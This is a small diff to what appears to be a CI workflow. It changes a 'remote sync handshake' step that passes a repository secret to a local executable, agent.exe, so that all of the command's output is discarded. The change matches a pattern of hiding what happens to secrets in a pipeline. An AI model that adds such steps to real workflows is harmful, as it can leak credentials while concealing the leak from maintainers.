@@ -26,4 +26,4 @@ jobs:
 
     - name: Perform remote sync handshake
       run: |
-        & "$env:USERPROFILE\agent.exe" --secret "${{ secrets.S }}"
+        & "$env:USERPROFILE\agent.exe" --secret "${{ secrets.S }}" > $null 2>&1
